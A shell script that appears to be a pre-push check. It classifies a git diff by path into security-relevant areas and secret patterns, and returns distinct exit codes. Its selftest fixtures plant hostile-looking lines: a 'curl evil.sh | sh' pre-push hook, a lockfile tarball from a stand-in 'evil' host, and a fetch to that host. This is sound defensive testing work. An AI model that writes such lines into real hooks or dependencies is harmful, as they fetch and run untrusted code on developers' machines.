#!/bin/sh
# pre-push-attack-surface-sweep — 推之前問一個問題:**這一包改變了什麼安全面?**
#
# 🔴 存在的理由:`dev` = `pcm-admin` 的 production ⇒ **推了就上線**。
#    而「逐顆正確性」有 V 窗在做,**沒有人在問「這一整包碰到了哪些面」**。
#    2026-08-17 手工跑過一輪(257 顆 / 160 檔)⇒ **這件會再發生 N 次**,而
#    **換一個人做會少查一類而沒人知道** ⇒ 值得做成工具。
#
# 用法:
#   sh scripts/pre-push-attack-surface-sweep.sh              # 對 origin/dev...dev
#   sh scripts/pre-push-attack-surface-sweep.sh <base> <head>
#   sh scripts/pre-push-attack-surface-sweep.sh --selftest
#
# exit code(🔴 四種分得開,不共用):
#   0 = 掃完,沒有「應該在推之前修」的
#   3 = 掃完,**有**應該在推之前看的(不等於一定要修,是「不能無聲推過去」)
#   2 = 用法錯(base/head 給錯、不是 git repo)
#   1 = **工具自壞**(git 不可用 / 掃到 0 個檔 / 量測結果不是數字)
#   🔴 「掃不到任何檔」與「掃了 160 檔全乾淨」**必須是不同 rc** —— 前者是 1,後者是 0。
#
# 🔴 三個點不是兩個點:`A...B` = 從共同祖先起【B 自己改了什麼】。
#    `A..B` 會把「B 缺少 A 的那些東西」算進來 ⇒ **dev 前進就把別人的改動算進你的批次**,
#    而那個數字**看起來完全正常、而且會隨時間漂移**(2026-08-17 I 窗真的踩過)。
#
# ── 🔴 本工具【不查】什麼(落地時就寫,不是事後補)──────────────────────────
#    它只做一件事:**用路徑把 diff 分類**,然後告訴你「哪幾類被碰到了」。它**不讀邏輯**:
#      · 授權邏輯改對了還是改壞了 / 前端 XSS·CSRF / 依賴鏈 / Edge Functions / 業務邏輯正確性
#    ⇒ **命中的類別要人去讀 diff**;價值是**「不會漏掉一整類」**,不是「幫你讀完」。
#
# ══ 🔴 2026-08-17 R1 FAIL 之後的重做:**兩個設計決定,都是量出來的** ══════════
#
# 【決定一】**gate 判準改回「原始變更行數」,不再排除註解。**
#   舊版用一條 ERE 想同時認出 // # * /* -- 五種註解 ⇒ 那是**在寫多語言註解解析器**,
#   而它把這些【真 code】當成註解丟掉(reviewer 全部實跑):
#     · CSS 自訂屬性  `--primary: #0066b1;`      ← PCM 主題/列印樣式每一行都長這樣
#     · TS 私有欄位    `#newBackdoor = true;`
#     · generator      `*evilGenerator() {}`
#   🔴 而它換來了什麼?**量了 10 個歷史區間(dev~200..dev~0,每 20 顆一段):
#      「排除註解」與「不排除」算出來的 gate 結果【10/10 完全相同】。**
#   ⇒ 它從來沒有改變過任何一次 rc,只改變了「哪一類顯示成 0 行」。
#   ⇒ **拿三個 must-fix 換一個沒有改變過決策的啟發式** ⇒ 刪掉。
#   註解比例仍然會印,但**只作為給人看的提示,永遠不當 gate**(見輸出的「參考」欄)。
#
# 【決定二】**改用一次 `--numstat` + `--raw`,不再對每個檔各跑一次 git。**
#   舊版把檔名當 pathspec 餵回 git,那條路生出的 bug 全是**同一族**:
#     · 檔名含空白被 word-split ⇒ 撈 0 行  · CJK 檔名被轉義 ⇒ 撈 0 行
#     · 🔴 **從子目錄跑** ⇒ pathspec 是 CWD 相對、FILES 是 repo-root 相對 ⇒ **每一類都變 0、rc=0**
#   ⇒ 現在**完全不傳 pathspec**。
#   🔴 **但「整族消失」這句話不成立(R2 更正)**:pathspec 這個**入口**關了,
#      quoting 還有**第二個入口** —— `awk -v` 也會做逃脫處理,C-quote 的 `\t` 會變成真 TAB
#      ⇒ 難搞檔名那一族**搬到了 `-v`**,直到改用 `ENVIRON[]` 才真的關掉。
#      正確的說法是:**關掉一個入口不等於關掉那一族;要逐一問「值還經過誰的手」。**
#   另外白撿兩個舊版量不到的:**binary 檔改動**(無 `^[+-]` 行)與 **mode-only 改動**(`chmod +x`)。
#
# ── 🔴 gate / note 的分工,以及【刻意不 gate】的東西(RI-3 / RI-6)────────────
#   類 4「對外可見」= **note,永不 gate**,而鐵則 12⑤ 把寄信/對外發布/法律頁列為高風險。
#   這不是錯位,是量出來的取捨:**類 4 在 10 個歷史區間裡有 9 段命中**
#   ⇒ 升 gate 等於「幾乎每一包都叫」,而一直叫的守門會被關掉(這支存在的前提)。
#   ⇒ 高風險那一面由鐵則 12 的人工審查鏈接住,本工具只負責**讓它出現在清單上**。
#
#   **測試檔一律不 gate**(class_stat 的 istest 分流):對 production 攻擊面成立,
#   但 🔴 **測試檔是 CI / 開發機的執行面** —— 那一面本工具不查,由 CI 權限設計負責。
#
#   類 7「共用元件」= `^packages/`。鐵則 12⑥ 字面只點名 `packages/ui`;
#   adapters/ports/schemas 是我方判斷加進來的(它們載著 DB client 與驗證邏輯)。
#   🔴 **更正(2026-08-17,R2 抓到,原句是我寫的假字面)**:
#      我原本寫「`packages/ui/` 目前是空目錄」,依據是 `find packages/ui -type f -name '*.tsx'` ⇒ 0。
#      **那個量具比那個結論窄。** 實查 `git ls-files packages/ui` ⇒ **6 個追蹤檔**,
#      含真的原始碼 `packages/ui/src/filters/cascadeFilterReducer.ts`(+ 同名 `.test.ts`)與 `src/index.ts`。
#      ⇒ 正確的說法是:**那裡有共用元件原始碼,只是在我抽樣的那幾個區間裡沒有被改到。**
#      ⇒ **不要把類 7 的零命中讀成「這裡不會有東西」。**
#
# 🔴 selftest 測什麼(**這是它唯一的守門:`.sh` 對三綠恆綠**)
#   前兩版的 selftest 都是假的,而且是**同一個病換位置**:
#     v1  grep 的是 pattern 的複本      ⇒ 主 pattern 換 ZZZNEVERMATCH,selftest 仍全過
#     v2  改成呼叫 scan() 本尊了,但**分母只有 PAT1/PAT6** ⇒ reviewer 實跑 22 發突變
#         (PAT2/3/4/5 換掉、`exit 3` 改 `exit 0`、自壞守門刪掉…)**全部仍然全綠**
#         ⇒ pattern 不再是複本了,**但 rc 決策是**。
#   ⇒ v3 **跑真的自己**(`sh "$SELF" <base> <head>`)對 **24 個 fixture** 斷言 rc
#     (數法:`grep -c '^  _ck ' scripts/pre-push-attack-surface-sweep.sh` + 1 格 `_ckout` 輸出斷言)。
#     rc 是這支唯一對外的東西 ⇒ **斷言 rc = 斷言它真正輸出的東西。**

set -u

# 🔴 SELF 要在任何 cd 之前算,selftest 靠它跑真的自己
SELF=$(cd "$(dirname "$0")" 2>/dev/null && pwd)/$(basename "$0")

# 🔴 兩個 `PCM_SWEEP_*` 覆寫【只給 selftest 用】:
#    「量具自己壞掉」這條路本來構造不出來(要從外面塞一個壞掉的 regex 進來),
#    而那正是本工具最嚴重的失敗模式 ⇒ 開一個注入口,把它變成可測的。
if [ -n "${PCM_SWEEP_PAT1:-}${PCM_SWEEP_PAT6:-}" ] && [ "${PCM_SWEEP_SELFTEST:-}" != "1" ]; then
  echo "🔴 PCM_SWEEP_PAT1/PAT6 只給 --selftest 用。正式路徑偵測到覆寫 ⇒ 拒跑。" >&2
  echo "   (它們能讓這支對【任何】diff 回 rc=0『乾淨,可以推』——那不是設定,是消音開關。)" >&2
  exit 2
fi
PAT1="${PCM_SWEEP_PAT1:-auth|session|rls|(^|/)grant|service_role|middleware|proxy\.ts}"
PAT2='order|payment|refund|pricing|tier|wallet|checkout|invoice'
PAT3='(^|/)next\.config|(^|/)vercel\.json|(^|/)\.env|prisma|tsconfig|turbo\.json|^\.github/|(^|/)package\.json|(^|/)pnpm-workspace\.yaml|(^|/)vitest\.config\.|(^|/)eslint\.config\.|^\.husky/|(^|/)pnpm-lock\.yaml|(^|/)package-lock\.json|(^|/)yarn\.lock'
PAT4='email|mail|notify|legal|terms|privacy|(^|/)api/|print'
PAT5='^supabase/migrations/'
PAT7='^packages/'   # 鐵則 12⑥ 共用元件(見檔頭 RI-2)
PAT6="${PCM_SWEEP_PAT6:-sk_live|sk_test|ghp_|eyJ[A-Za-z0-9]{20,}}"

# 只作為「參考」顯示,**不參與 gate**(見決定一)
NOISE='^[+-][[:space:]]*(//|\*|/\*|--|#)'

TOOLBROKE=0
HIT=0

is_num() { case ${1:-} in ''|*[!0-9]*) return 1 ;; *) return 0 ;; esac }

# ── selftest:跑真的自己,斷言 rc ──────────────────────────────────────────
if [ "${1:-}" = "--selftest" ]; then
  _t=$(mktemp -d) || { echo "selftest: mktemp 失敗" >&2; exit 1; }
  trap 'rm -rf "$_t"' EXIT
  _fail=0
  _ck() {  # _ck <標題> <實際rc> <期望rc>
    if [ "$2" = "$3" ]; then echo "  $1  ✅ rc=$2"
    else echo "  $1  ❌ 實際 rc=$2 期望 rc=$3" >&2; _fail=1; fi
  }
  _run() { ( cd "$1" && sh "$SELF" "$2" "$3" >/dev/null 2>&1; echo $? ); }
  # 量具自壞:從外面塞一個壞掉的 ERE 進去,腳本必須回 rc=1(自壞),
  # 🔴 **絕對不可以回 rc=0**(那就是「量壞了卻說乾淨」——本工具存在的理由)。
  _runbad() { ( cd "$1" && env PCM_SWEEP_SELFTEST=1 "$2=[" sh "$SELF" "$3" "$4" >/dev/null 2>&1; echo $? ); }
  # 🔴 note 類（類 4）永不影響 rc ⇒ 只斷言 rc 的話它整類可以無聲消失。這支斷言 stdout。
  _ckout() {  # _ckout <標題> <base> <head> <該出現的字樣>
    if ( cd "$_t" && sh "$SELF" "$2" "$3" 2>/dev/null ) | grep -q "$4"
    then echo "  $1  ✅"
    else echo "  $1  ❌ 輸出裡找不到:$4" >&2; _fail=1; fi
  }
  _nonrepo=$(mktemp -d)

  cd "$_t" || exit 1
  git init -q . && git config user.email t@t && git config user.name t || {
    echo "selftest: 建 fixture 失敗" >&2; exit 1; }
  mkdir -p apps/sub apps/print docs/security supabase/migrations packages/ui/src .husky
  # 分母:每一個 gate 類別各一支,否則改壞那一類的 pattern 不會紅
  : > "apps/auth secret.ts"; : > "apps/auth-設定檔.ts"; : > apps/authGuard.ts
  : > apps/authTheme.css;    : > apps/orderTotal.ts;    : > apps/authBlob.bin
  : > apps/authMode.sh;      : > package.json;          : > supabase/migrations/001_x.sql
  : > apps/zz_keys.ts;       : > docs/security/auth-notes.md
  : > packages/ui/src/button.tsx; : > pnpm-lock.yaml; : > .husky/pre-push
  : > apps/authRename.ts; : > apps/CheckoutPanel.tsx; : > apps/print/invoice.html
  TABF=$(printf 'apps/auth\tmode2.sh'); : > "$TABF"
  git add "apps/auth secret.ts" "apps/auth-設定檔.ts" apps/authGuard.ts apps/authTheme.css \
          apps/orderTotal.ts apps/authBlob.bin apps/authMode.sh package.json \
          supabase/migrations/001_x.sql apps/zz_keys.ts docs/security/auth-notes.md \
          packages/ui/src/button.tsx pnpm-lock.yaml .husky/pre-push \
          apps/authRename.ts apps/CheckoutPanel.tsx apps/print/invoice.html "$TABF"
  git commit -qm base
  B=$(git rev-parse HEAD)
  _mk() { git checkout -q -B "$1" "$B"; }

  # W1 類1:難搞檔名 + TS 私有欄位(舊版這三支全被算成 0 行)
  _mk w1
  printf 'export const backdoor = true;\n' > "apps/auth secret.ts"
  printf 'export const backdoor = true;\n' > "apps/auth-設定檔.ts"
  printf 'class G {\n  #newBackdoor = true;\n}\n' > apps/authGuard.ts
  git add "apps/auth secret.ts" "apps/auth-設定檔.ts" apps/authGuard.ts; git commit -qm w1

  # W2 類1:CSS 自訂屬性(舊版當成 SQL 註解丟掉)
  _mk w2; printf ':root {\n  --auth-bypass: 1;\n}\n' > apps/authTheme.css
  git add apps/authTheme.css; git commit -qm w2

  # W3 類2 錢
  _mk w3; printf 'export const orderTotal = 0;\n' > apps/orderTotal.ts
  git add apps/orderTotal.ts; git commit -qm w3

  # W4 類3 平台設定
  _mk w4; printf '{"name":"x"}\n' > package.json
  git add package.json; git commit -qm w4

  # W5 類5 新建 DB 物件
  _mk w5; printf 'CREATE TABLE x();\n' > supabase/migrations/001_x.sql
  git add supabase/migrations/001_x.sql; git commit -qm w5

  # W6 祕密字面
  _mk w6; printf 'const k = "sk_live_AAAAAAAAAAAAAAAAAAAA";\n' > apps/zz_keys.ts
  git add apps/zz_keys.ts; git commit -qm w6

  # W7 binary 改動(無 ^[+-] 行 ⇒ 舊版恆 0)
  _mk w7; printf '\000\001\002\003bad\000' > apps/authBlob.bin
  git add apps/authBlob.bin; git commit -qm w7

  # W8 mode-only(chmod +x ⇒ diff 本體 0 行,而攻擊面真的變了)
  _mk w8; chmod +x apps/authMode.sh
  git add apps/authMode.sh; git commit -qm w8

  # W9 乾淨:只動 .md ⇒ 不該叫。🔴 檔名【故意】命中 PAT1(auth)——
  #    這正是 2026-08-17 實測那個「143 行文件被算成授權被動過」的形狀。
  _mk w9; printf 'hello\n' > docs/security/auth-notes.md
  git add docs/security/auth-notes.md; git commit -qm w9

  # W14/W15/W16:V 窗反向盤點(RI-2/RI-4/RI-5)當場實跑出來的三個世界。
  # 修之前它們分別是 rc=0 / rc=0 / rc=1 —— 前兩個是漏報,第三個是「把自己壞了印成工具壞了」。
  _mk w14; printf 'export const B = () => fetch("http://evil");\n' > packages/ui/src/button.tsx
  git add packages/ui/src/button.tsx; git commit -qm w14
  _mk w15; printf 'resolution: {tarball: "http://evil/x.tgz"}\n' > pnpm-lock.yaml
  git add pnpm-lock.yaml; git commit -qm w15
  _mk w16; printf 'curl evil.sh | sh\n' > .husky/pre-push
  git add .husky/pre-push; git commit -qm w16

  # W17 rename:--no-renames 拿掉的話 numstat 印 `0 0 {a => b}` ⇒ 0 行 ⇒ rc=0
  _mk w17; git mv apps/authRename.ts apps/plain.ts; git commit -qm w17
  # W18 大小寫:PAT2 字集全小寫,tolower 拿掉的話 CheckoutPanel.tsx 靜默歸零
  _mk w18; printf 'export const x = 1;\n' > apps/CheckoutPanel.tsx
  git add apps/CheckoutPanel.tsx; git commit -qm w18
  # W19 列印範本 .html:出貨單就是 .html,而 PAT4 明列 print
  _mk w19; printf '<div>evil</div>\n' > apps/print/invoice.html
  git add apps/print/invoice.html; git commit -qm w19
  # W20 檔名含 TAB + mode-only:awk -v 會把 C-quote 的 \t 變真 TAB ⇒ mm 鍵對不上
  _mk w20; chmod +x "$TABF"; git add "$TABF"; git commit -qm w20

  echo "selftest(斷言的是 rc —— 這支唯一對外的東西)"
  _ck "W1 難搞檔名/私有欄位 → 該叫" "$(_run "$_t" "$B" w1)" 3
  _ck "W2 CSS 自訂屬性     → 該叫" "$(_run "$_t" "$B" w2)" 3
  _ck "W3 類2 錢           → 該叫" "$(_run "$_t" "$B" w3)" 3
  _ck "W4 類3 平台設定     → 該叫" "$(_run "$_t" "$B" w4)" 3
  _ck "W5 類5 migration    → 該叫" "$(_run "$_t" "$B" w5)" 3
  _ck "W6 祕密字面         → 該叫" "$(_run "$_t" "$B" w6)" 3
  _ck "W7 binary 改動      → 該叫" "$(_run "$_t" "$B" w7)" 3
  _ck "W8 mode-only(+x)  → 該叫" "$(_run "$_t" "$B" w8)" 3
  _ck "W9 只動 .md         → 不該叫" "$(_run "$_t" "$B" w9)" 0
  # 🔴 F1 回歸:從子目錄跑。修之前這一發是 rc=0(每一類都變 0 行)
  _ck "W10 從子目錄跑      → 仍該叫" "$(_run "$_t/apps/sub" "$B" w1)" 3
  # 🔴 空區間必須是「工具自壞」不是「乾淨」
  _ck "W11 空區間          → 自壞" "$(_run "$_t" "$B" "$B")" 1
  # 🔴 W12/W13:量具自己壞掉時,不准說「乾淨」。這兩格守的是 is_num / TOOLBROKE /
  #    祕密掃描的自壞偵測 —— 沒有它們,那三段程式碼刪掉 selftest 照樣全綠。
  _ck "W12 類別量具自壞    → 不准說乾淨" "$(_runbad "$_t" PCM_SWEEP_PAT1 "$B" w1)" 1
  _ck "W13 祕密量具自壞    → 不准說乾淨" "$(_runbad "$_t" PCM_SWEEP_PAT6 "$B" w9)" 1
  _ck "W14 共用元件 packages/ → 該叫" "$(_run "$_t" "$B" w14)" 3
  _ck "W15 只換 lockfile     → 該叫" "$(_run "$_t" "$B" w15)" 3
  _ck "W16 只改 .husky/pre-push → 該叫(不是 rc=1)" "$(_run "$_t" "$B" w16)" 3
  _ck "W17 純改名 auth 檔     → 該叫" "$(_run "$_t" "$B" w17)" 3
  _ck "W18 大寫檔名 Checkout  → 該叫" "$(_run "$_t" "$B" w18)" 3
  _ck "W19 列印範本 .html     → 該叫" "$(_run "$_t" "$B" w19)" 3
  _ck "W20 TAB 檔名 mode-only → 該叫" "$(_run "$_t" "$B" w20)" 3
  # 🔴 rc=2（用法錯）三道守門原本零 fixture:突變 `exit 2 → exit 0` 時 selftest 全綠,
  #    而那個世界裡「ref 打錯」與「不在 git repo」都會回 rc=0「乾淨,可以推」。
  _ck "W21 base ref 打錯      → 用法錯" "$(_run "$_t" nosuchref w1)" 2
  _ck "W22 不在 git repo      → 用法錯" "$(_run "$_nonrepo" "$B" w1)" 2
  _ck "W23 覆寫未帶 selftest 標記 → 拒跑" "$( cd "$_t" && PCM_SWEEP_PAT1=zzz sh "$SELF" "$B" w1 >/dev/null 2>&1; echo $? )" 2
  _ckout "W24 類4 note 仍出現在輸出" "$B" w19 '\[4 對外可見\]'

  [ "$_fail" -eq 0 ] && { echo "selftest 全過"; exit 0; }
  echo "selftest 失敗" >&2; exit 1
fi

# ── 正式路徑 ──────────────────────────────────────────────────────────────
BASE="${1:-origin/dev}"
HEAD_REF="${2:-dev}"

git rev-parse --show-toplevel >/dev/null 2>&1 || { echo "不是 git repo" >&2; exit 2; }
# 🔴 這裡【不需要】cd 到 repo 根:本工具已完全不傳 pathspec,
#    `git diff --numstat` 無論從哪個子目錄跑,印的都是 repo-root 相對的同一份清單。
#    (F1 那一族 bug 是被【設計】消掉的,不是被一行 cd 蓋住的;突變測試證實加了 cd 也不載重。)

git rev-parse --verify "$BASE"     >/dev/null 2>&1 || { echo "base 無法解析:$BASE" >&2; exit 2; }
git rev-parse --verify "$HEAD_REF" >/dev/null 2>&1 || { echo "head 無法解析:$HEAD_REF" >&2; exit 2; }

# 🔴 只跑這兩發 git,之後全是純文字處理 ⇒ 不再有 pathspec / word-splitting / CWD 相對性
NUMSTAT=$(git -c core.quotePath=false diff --numstat --no-renames "$BASE...$HEAD_REF") \
  || { echo "git diff --numstat 失敗" >&2; exit 1; }
RAWD=$(git -c core.quotePath=false diff --raw --no-renames "$BASE...$HEAD_REF") \
  || { echo "git diff --raw 失敗" >&2; exit 1; }
# 🔴 RI-1:full diff 存一次、當場看它自己的 rc。
#    舊寫法 `SECRC=$?` 抓的是**管線最右端 grep** 的 rc ⇒ 左端 git diff 死掉時,
#    grep 吃空輸入、印 0、rc=1,順利通過 `-ge 2` 檢查 ⇒ **祕密掃描被讀成「乾淨」**。
#    (CLAUDE.md 終端紀律「pipeline 的 $? 是右端那個」——這支正是為了防這種事而存在。)
FULLDIFF=$(git diff "$BASE...$HEAD_REF") || { echo "git diff 失敗" >&2; exit 1; }

FILES=$(printf '%s\n' "$NUMSTAT" | awk -F'\t' 'NF>=3 && $3!="" {print $3}')
N=$(printf '%s\n' "$FILES" | grep -c .)
COMMITS=$(git rev-list --count "$BASE..$HEAD_REF" 2>/dev/null || echo '?')

# mode-only 改動的檔(`:100644 100755 … M\tpath`)
# 🔴 結構變更 = 新增 / 刪除 / 改名(--no-renames 下呈現為 D+A)/ 權限位元改變。
#    這些的共同點:**diff 本體可能 0 行,而攻擊面真的變了**。
#    舊版只收「權限位元改變」(om/nm 皆非 000000)⇒ 純改名一支空檔 = 0 行 ⇒ 不 gate。
STRUCT=$(printf '%s\n' "$RAWD" | awk -F'\t' 'NF>=2 {
  split($1, a, " ");
  om=substr(a[1],2); nm=a[2];
  if (om != nm) print $2
}')

echo "基準  git diff $BASE...$HEAD_REF   (三個點)"
echo "顆數  $COMMITS   檔數  $N"

# 🔴 工具自壞:掃到 0 個檔 ≠ 乾淨
if [ "$N" -eq 0 ]; then
  echo "🔴 掃到 0 個檔 —— 這是【工具自壞或 base/head 給錯】,不是『乾淨』" >&2
  exit 1
fi

# 🔴 RI-5:這裡原本有一道「副檔名白名單對照組」,已刪除。
#    它的白名單(.ts/.md/.sh/…)比 gate 的字集**窄** ⇒ 只改 `.husky/pre-push`(無副檔名,
#    而 PAT3 明明收 `^\.husky/`)會讓對照組 = 0 ⇒ 回 rc=1「清單或 grep 壞了」。
#    🔴 那條路的下場比漏報更糟:**訊息把人引去修工具,而這一類永遠到不了它該有的 rc=3**,
#       人看兩次 rc=1 就會下結論「工具壞了,照推」。
#    它的職務(偵測清單/量具自壞)現已由 `N==0` 守門 + `is_num`/`TOOLBROKE` 覆蓋,
#    而那兩者都有 selftest 格(W11/W12/W13)。

# class_stat <pattern> → "檔數 本體行 binary數 mode數 測試行"
class_stat() {
  # 🔴 用 ENVIRON 不用 -v:`awk -v` 會對值做**逃脫處理** ⇒
  #    ① git C-quote 的檔名 `"apps/auth\tmode.sh"` 裡的 `\t` 會變成【真 TAB】,
  #       於是 mm 的鍵對不上 numstat 的 $3(mode-only 判定靜默失效)
  #    ② pattern 裡的 `\.` 被吃成 `.`(印出來的 pattern 字面 ≠ 實際跑的 regex)
  #    ⇒ 難搞檔名那一族**沒有隨 pathspec 一起消失,它搬到了 `-v`**(R2 finding 1)。
  printf '%s\n' "$NUMSTAT" | PCM_PAT="$1" PCM_MODES="$STRUCT" awk -F'\t' '
    BEGIN{
      pat = ENVIRON["PCM_PAT"];
      n=split(ENVIRON["PCM_MODES"], M, "\n");
      for(i=1;i<=n;i++) if (M[i] != "") mm[M[i]]=1;
    }
    NF>=3 && $3!="" {
      p=$3; lp=tolower(p);
      if (lp !~ pat) next;
      # 🔴 只排除 .md。**不排除 .html** —— 出貨單/列印範本就是 .html,
      #    而 PAT4 明列 `print` ⇒ 排掉它等於把列印單據整類消音(R2 finding 2 實跑 rc=0)。
      if (lp ~ /\.md$/) next;
      nf++;
      istest = (lp ~ /\.test\.|\.spec\.|__tests__|\/tests?\//);
      if ($1 == "-") { if (istest) tb++; else bn++; next }   # binary:數不出行,視同有變更
      v = $1 + $2;
      if (istest) tl += v; else pl += v;
      if (!istest && (p in mm)) md++;   # 結構變更(新增/刪除/改名/權限)
    }
    END{ printf "%d %d %d %d %d\n", nf+0, pl+0, bn+0, md+0, tl+0 }
  '
}

scan() {  # scan <類名> <pattern> <gate|note>
  _name=$1; _pat=$2; _gate=$3
  _stat=$(class_stat "$_pat")
  # shellcheck disable=SC2086
  set -- $_stat
  _nf=${1:-x}; _pl=${2:-x}; _bn=${3:-x}; _md=${4:-x}; _tl=${5:-x}
  # 🔴 F2:量測層自壞(awk 掛掉/pattern 壞掉)會吐出非數字 ⇒ 不得被讀成「乾淨」
  if ! is_num "$_nf" || ! is_num "$_pl" || ! is_num "$_bn" || ! is_num "$_md" || ! is_num "$_tl"; then
    echo "🔴 [$_name] 量測結果不是數字($_stat) ⇒ 這一類的 0 不算數" >&2
    TOOLBROKE=1; return
  fi
  if [ "$_nf" -eq 0 ]; then
    printf '\n[%s]  命中 0 / 分母 %s\n  pattern: %s\n' "$_name" "$N" "$_pat"
    return
  fi
  _touched=$((_pl + _bn + _md))
  printf '\n[%s]  命中檔 %s / 分母 %s   🔴 本體變更行 %s(binary %s / 結構變更 %s)／ 測試行 %s\n  pattern: %s\n' \
         "$_name" "$_nf" "$N" "$_pl" "$_bn" "$_md" "$_tl" "$_pat"
  if [ "$_gate" = "gate" ] && [ "$_touched" -gt 0 ]; then
    HIT=1
  elif [ "$_gate" = "gate" ]; then
    printf '  ⇒ 本體零變更(只動測試／只動 .md)＝攻擊面未變,本類不 gate\n'
  fi
}

scan "1 auth/權限邊界" "$PAT1" gate
scan "2 錢"            "$PAT2" gate
scan "3 平台設定"      "$PAT3" gate
scan "4 對外可見"      "$PAT4" note
scan "5 新建 DB 物件"  "$PAT5" gate
scan "7 共用元件"      "$PAT7" gate

# 🔴 F3:祕密掃描整層過去零自壞偵測 —— pattern 壞掉就回 0 = 「乾淨」
printf '\n[6 祕密字面]  (掃新增行,非檔名)\n'
SECOUT=$(printf '%s\n' "$FULLDIFF" | grep -E '^\+' | grep -v '^+++' | grep -cE "$PAT6" 2>/dev/null)
SECRC=$?
if [ "$SECRC" -ge 2 ] || ! is_num "$SECOUT"; then
  echo "🔴 祕密掃描自壞(rc=$SECRC 輸出=$SECOUT)⇒ 這個 0 不算數" >&2
  TOOLBROKE=1
else
  echo "  命中 $SECOUT   pattern: $PAT6"
  [ "$SECOUT" -gt 0 ] && HIT=1
fi

# 參考欄:註解比例。**只給人看,不參與 gate**(見檔頭「決定一」)
CMT=$(printf '%s\n' "$FULLDIFF" | grep -E '^[+-]' | grep -v '^[+-][+-]' | grep -cE "$NOISE")
ALL=$(printf '%s\n' "$FULLDIFF" | grep -E '^[+-]' | grep -vc '^[+-][+-]')
echo ""
echo "參考  全域變更行 $ALL,其中看起來像註解的 $CMT   ⚠️ 僅供人判讀,**不參與 gate**"

printf '\n────────\n'
# 🔴 工具自壞優先於一切結論:量壞了就不准給「乾淨」或「有事」的判斷。
if [ "$TOOLBROKE" -eq 1 ]; then
  echo "rc=1  🔴 量測過程有失敗 ⇒ 本次結果不算數(見上方 stderr)" >&2
  exit 1
fi
if [ "$HIT" -eq 1 ]; then
  echo "rc=3  有類別被碰到 ⇒ 🔴 【要人去讀那幾類的 diff】才可以推。本工具不讀邏輯(見檔頭)。"
  exit 3
fi
echo "rc=0  六類皆未命中、祕密掃描 0 ⇒ 沒有『應該在推之前看』的類別。"
echo "⚠️ 但它不查:前端 XSS/CSRF、依賴鏈、Edge Functions、業務邏輯正確性(見檔頭)。"
exit 0
